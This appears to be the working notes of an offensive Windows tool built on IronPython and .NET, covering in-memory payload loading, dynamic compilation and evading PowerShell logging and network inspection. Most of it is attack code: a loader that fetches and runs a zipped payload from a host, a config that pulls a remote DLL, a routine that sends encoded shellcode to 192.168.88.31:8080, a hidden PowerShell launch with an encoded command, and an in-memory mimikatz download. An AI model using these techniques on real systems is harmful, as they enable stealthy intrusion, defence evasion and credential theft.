

# TODO 
```
Methods:
- Alt Streams delivery
- csc compilation to AppTemp
- app.exe.config download of content to Temp/dl3
- loading python stdlib from PKzip (docx)
- loading .net modules
- memory mapped registry of source compile (py and cs)
- python exploit scripts compat (msf payloads)
- loading and executing exes from memory (mimikatz)
- side loading pip packages in zips. 
- Win32 API call proxy (.cs or .py)


top
	python
		stdlib load file <file> 
		stdlib load url <url> <localfile>
		module load url <url> <mmap|file>
		module load <file>
		exec module <name>
		repl <mode>

	dotnet
		assembly load file <file>
		assembly load url <url> <file>

		module load url <url>
		module compile file <file> <name>
		module compile file <file>

```

            
## Example: Invoking Iron Python from IronPython over .Net Assembly w/variables (-> stealth)
```python
import clr
clr.AddReference('IronPython')
clr.AddReference('Microsoft.Scripting')

from IronPython.Hosting import Python
from Microsoft.Scripting import SourceCodeKind

code = "print string"
values = {'string': 'Hello World'}

engine = Python.CreateEngine()
source = engine.CreateScriptSourceFromString(code, SourceCodeKind.Statements)
mod = engine.CreateScope()

for name, value in values.items():
    setattr(mod, name, value)

source.Execute(mod)
```


## CSX Example: List available managed compliers on the system
```csharp
directive> using System;
directive> using System.IO;
directive> using System.Text;
directive> using System.CodeDom;
directive> using System.Diagnostics;
directive> using System.CodeDom.Compiler;
directive> END
code> foreach (System.CodeDom.Compiler.CompilerInfo ci in
code> System.CodeDom.Compiler.CodeDomProvider.GetAllCompilerInfo())
code> {
code>   foreach (string language in ci.GetLanguages())
code>   System.Console.Write("{0} ", language);
code>   System.Console.WriteLine();
code> }
code> END
Perforing dynamic compile and execution.

--- Result ---
c# cs csharp
vb vbs visualbasic vbscript
js jscript javascript
c++ mc cpp
directive>
```


# Load over newtwork

Exmaple: Direct PYDLR invoke
```csharp

WebClient wc = new WebClient();
Console.WriteLine("Getting Code payloads ...");
byte[] dllzip = wc.DownloadData(@"http://127.0.0.1:8000/Code.zip");

Stream zipdata = new MemoryStream(scriptzip);
Stream unzippedDataStream;
ZipArchive archive = new ZipArchive(zipdata, ZipArchiveMode.Read);

foreach (ZipArchiveEntry entry in archive.Entries)
{

    if (entry.FullName == @"payload.py")
    {
        Console.WriteLine("Unzipped File: {0}", entry.Name);
        unzippedDataStream = entry.Open();

        StreamReader reader = new StreamReader(unzippedDataStream);
        string codeText = reader.ReadToEnd();
        pythonScript = pengine.CreateScriptSourceFromString(codeText);
        Console.WriteLine("Executing Source >>>  {0} <<< ...", 
                        codeText.Substring(0, (codeText.Length >= 80) ? 79 : codeText.Length));
        pythonScript.Execute();
    }

}

```

Example: Stage code in memory mapped file (.e.g further compilation)

```csharp
Dictionary<String, MemoryMappedFile> mmfRepo = new Dictionary<String, MemoryMappedFile>();

// Load network bytes into memory stream and unzip in memory.
Stream dllzipdata = new MemoryStream(dllzip);
ZipArchive dllarchive = new ZipArchive(dllzipdata, ZipArchiveMode.Read);

Stream unzippedCSDataStream;
MemoryMappedFile mmf;
foreach (ZipArchiveEntry entry in dllarchive.Entries)
{
    if (entry.Name == @"payload.cs")
    {
        Console.WriteLine("Unzipped CSharp: {0}", entry.Name);
        unzippedCSDataStream = entry.Open();
        // Prepare Memory Map for file
        mmf = MemoryMappedFile.CreateNew(entry.Name, entry.Length);

        // Save mmf
        mmfRepo.Add(entry.Name, mmf);

        StreamReader reader = new StreamReader(unzippedCSDataStream);
        string codeText = reader.ReadToEnd();

        byte[] Buffer = ASCIIEncoding.ASCII.GetBytes(codeText);
        using (MemoryMappedViewStream stream = mmf.CreateViewStream())
        {
            BinaryWriter writer = new BinaryWriter(stream);
            writer.Write(Buffer);
        }
    }
}
```


 
### Methods of bringing assemblies across inspected network:

1. Compile `.cs` code and have DLLs as embedded resources 
`/csc /resource:Ironpython.dll`

2. Bring netmodules across inspected lines 

`csc -target:module payload.cs `
`csc /netmodule:module`

Also, see Examples\ComplileNetMod.py
3. Possibly used .Net Download Cache 


`gacutul /ldl`

(Location where it downloads):
 C:\Users\dimas\AppData\Local\assembly\dl3\


You can modify. `yourexe.exe.config` file and point to remote DDL to fetch. 

Example:

```xml
 <?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <startup>
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5.2" />
  </startup>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity
          name="IronPython"
          publicKeyToken="7f709c5b713576e1"
          culture="" />
        <codeBase version="2.7.7.0" href="http://127.0.0.1:8000/IronPython.dll" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
</configuration>
```




# Logging evasion while maintaining productivity 

## cPython: Not logged but you need cPython on target machine (blacklisted)

```python
import urllib2
content = urllib2.urlopen("http://google.com").read()
print(content)
```

## C#: Not logged, requires invocation of csc.exe from potentially logged shell


```csharp
using System.Net
var content = string.Empty;
using (var webClient = new WebClient())
{
    content = webClient.DownloadString("http://google.com");
    Console.WriteLine(content);
}
```

## Powershell 5: Logged 

```powershell
$webClient = New-Object System.Net.WebClient
$content = $webClient.DownloadString("http://google.com")
Out-Host $content 
```

## Options: 
1) Dymamic CS compil
2) DLR

## Python DLR. Not logged, dynamic, some batteries included. as long as you can run an unsigned executable or 
installutil: `%windir%\Microsoft.NET\Framework\v2.0.50727\installutil /logtoconsole=false /logfile= /u [your assembly .dll here]`

##  CSX script
```csharp 
using System; 
using System.Net;
END
WebClient client = new WebClient();
String address = @"https://google.com";
string reply = client.DownloadString (address);
Console.WriteLine("{0} ... ", reply.Substring(0, 80));
END
```

## PYDLR csript
```python
from System.Net import WebClient
content = WebClient().DownloadString("http://google.com")
print content
```

Evasion with productivity. .Net DLR + Python vs. Powershell


## IPY introspection via reflection. Even more stelth

`TestClass.py`
```python 
# The class you want to access externally.
class DoCalculations():

 # A method within the class that adds two numbers.
 def DoAdd(self, First, Second):
    # Provide a result.
    return First + Second

# A test suite in IronPython.
def __test__():

 # Create the object.
 MyCalc = DoCalculations()

 # Perform the test.
 print MyCalc.DoAdd(5, 10)
```

Normal IronPython invoke:
```csharp 
// Obtain the runtime.
var IPY = Python.CreateRuntime();
// Create a dynamic object containing the script.
dynamic TestPy = IPY.UseFile(“TestClass.py”);
// Execute the __test__() method.
TestPy.__test__();
```

Reflective IronPython Invoke
```csharp
// Introspect iPython module:
// Create an object for performing tasks with the script.
ObjectOperations Ops = Eng.CreateOperations();
// Create the class object.
Source.Execute(Scope);
// Obtain the class object.
Object CalcClass = Scope.GetVariable(“DoCalculations”);
// Create an instance of the class.
Object CalcObj = Ops.Invoke(CalcClass);
// Get the method you want to use from the class instance.
Object AddMe = Ops.GetMember(CalcObj, “DoAdd”);
// Perform the add.
Int32 Result = (Int32)Ops.Invoke(AddMe, 5, 10);
```


## Python without STDLib 
>>> print sys.builtin_module_names
('unicodedata', '_ast', 'imp', 'future_builtins', 'clr', 'exceptions', '__builtin__', 'sys', 'array', 'binascii', 'bz2', 'cmath', 'msvcrt', 'mmap', 'signal', 'winsound', 'zipimport', 'zlib', '_bisect', '_codecs', '_collections', 'copy_reg', 'cPickle', 'cStringIO', 'datetime', 'errno', 'gc', 'itertools', '_csv', '_io', '_locale', 'marshal', 'math', '_md5', 'nt', 'operator', 're', 'select', '_sha', '_sha256', '_sha512',/ 'socket', '_ctypes', '_ctypes_test', '_heapq', '_struct', 'thread', 'time', 'xxsubtype', '_functools', '_random', '_sre', '_ssl', '_subprocess', '_warnings', '_weakref', '_winreg')



## load Ironpython Stdlib from zip. Zip can also be brought in as `docx`
```python
sys.path.append(r"C:\Users\dimas\Downloads\dist\StdLib.docx")
```
Benefits of StdLib you get a lot more `python` modules. Example:
`import traceback, os`

```python
import clr, sys
clr.AddReference('StdLib')
import  traceback, urllib
try:
  opener = urllib.FancyURLopener({})
  f = opener.open(r"http://www.python.org/")
  f.read()
except Exception as e:
  traceback.print_exc(file=sys.stdout)
  print e
END
```

# Assemblies not need to be named DDL (.NEt loader does not care about name, only embeded manifest)
import clr
clr.AddReferenceToFileAndPath(r"C:\\Users\\dimas\\AppData\\Local\\Temp\tmp14A5.tmp")




### Win Forms

```python 
import clr; 
clr.AddReference("System.Windows.Forms") ;
from System.Windows.Forms import *; 
clr.AddReference("System.Drawing") ; 
clr.AddReference("System.Windows.Forms") ;
f = Form(); 
f.Show()
```


```python 
clr.AddReference("System.Windows.Forms")

from System.Windows.Forms import MessageBox
MessageBox.Show("Hello World")

from System.Threading import Thread, ThreadStart
def f():
   Thread.Sleep(1000)
   print "Thread Finished"

f()
```


## Compile PyDLR into dll

test.py:
```python
def hello():
    print "Hello"
```

```python
import clr
clr.CompileModules("test.dll", "test.py")
clr.AddReferenceByPartialName("test")
import test
print test.hello()
```

## Python DLR to Exe
```batch
.\Typhoon.exe  -mode=exec -type=py -method=sfile -resource=..\..\Examples\Extensions\Pyc.py -targs="/target:exe /platform:x64 /main:test_main.py test_main.py" 

copy ..\..\Resources\IronPython.dll .
copy ..\..\Resources\Microsoft.Dynamic.dll .
copy ..\..\Resources\Microsoft.Scripting.dll .
```


## Multiline Pyrepl
```python 
import clr
clr.AddReference("System.Windows.Forms")
from System.Windows.Forms import MessageBox
MessageBox.Show("Hello World")
END
```

## Interop


## CSharp via DLLImport
```csharp
using System
using System.Runtime.InteropServices;

[DllImport("user32.dll", SetLastError = true)]
static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
    IntPtr thisW = FindWindowEx(IntPtr.Zero, IntPtr.Zero, null, "Downloads");

[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
public static extern bool SetWindowText(IntPtr hwnd, String lpString);
    SetWindowText(thisW, "Hello");
```

## Unamanged code via CodeDom from PyDLR:
See Examples\DLRExample1.py

## Unmanaged code via Ctypes (needs IP STDLib)
```python
import ctypes
buffer = ctypes.create_string_buffer(100)
ctypes.windll.kernel32.GetWindowsDirectoryA(buffer, len(buffer))
print buffer.value
```

See Examples\NCtypes.py

## Dynamic WinaPi invoke cs script with shim assist

```csharp
using System; 
using DynamicLoad;
END
dynamic user32 = DynLibUtil.LoadWinapiPInvoke("user32");
user32.MessageBox(0, "Hello World", "P/Invoke Sample", 0);
END
```


## SEE Capture_via_compile 
```python
try:
    import socket
except Exception as e:
    print e


from System.Threading import Thread, ThreadStart

def scode():
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect(("192.168.88.31", 8080))

  buf =  ""
  buf += "\xdb\xc3\xbd\x9c\xec\x7c\x70\xd9\x74\x24\xf4\x5a\x31"
  buf += "\xc9\xb1\x89\x31\x6a\x17\x03\x6a\x17\x83\x76\x10\x9e"
  buf += "\x85\x5d\x36\xe2\xbc\xbe\xe4\x03\x98\x34\xd3\xcf\x45"
  buf += "\x41\x7a\xf3\xc9\x40\x60\x8d\x72\x24\x0c\x83\xf8\x1d"
  buf += "\x7a\x89\x79\xe9\xe6\x4d\x96\xd6\xe8\x22\x02\x21\xcd"
  buf += "\x18\x2c\x21\x6d\x85\xa1\xa0\xcb\x88\xfd\x01\x0d\x7b"
  buf += "\xdc\x3a\x3f\x58\xec\x00\x16\x38\x52\x32\xb2\x79\xb4"
  buf += "\x39\x23\x2f\xae\xbe\x29\xd3\x63\xb1\xc6\xb5\xf9"


  sock.send(buf)
  sock.close()

scode()


```

## If you want powerhell you could do:
```python 
try:
    from System.Diagnostics import Process
    #Process.Start('powershell.exe', '')
except Exception as e:
    traceback.print_exc(file=sys.stdout)

p = Process()
p.StartInfo.UseShellExecute = False
p.StartInfo.RedirectStandardOutput = True
p.StartInfo.FileName = 'pOwersHell.exE'
p.StartInfo.Arguments = " -nop -encodedcommand JABzAD0ATgBlAHcALQBPAGI ..... "
p.Start()
p.WaitForExit() 
```



## Example PYDLR: Casting, Typing, Lambdas 
```python
from System.Collections.Generic import IEnumerable, List
list = List[int]([1, 2, 3])
import clr
clr.AddReference("System.Core")
from System.Linq import Enumerable
Enumerable.Any[int](list, lambda x : x < 2)
```




## Download of file over TLS, Unzip into memory

zip=wc.DownloadData("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180322/mimikatz_trunk.zip")
zipdata = MemoryStream(zip)

archive = ZipArchive(zipdata, ZipArchiveMode.Read)
print(archive)
<System.IO.Compression.ZipArchive object at 0x000000000000002B [System.IO.Compression.ZipArchive]>



TODO: https://github.com/IronLanguages/dlr/releases


TODO: C:\Users\dimas\Downloads\IronPython-2.7.7-win\IronPython-2.7.7\Platforms

0. Add resourced in resource editor
1. Buidl actio: Embeedded resource

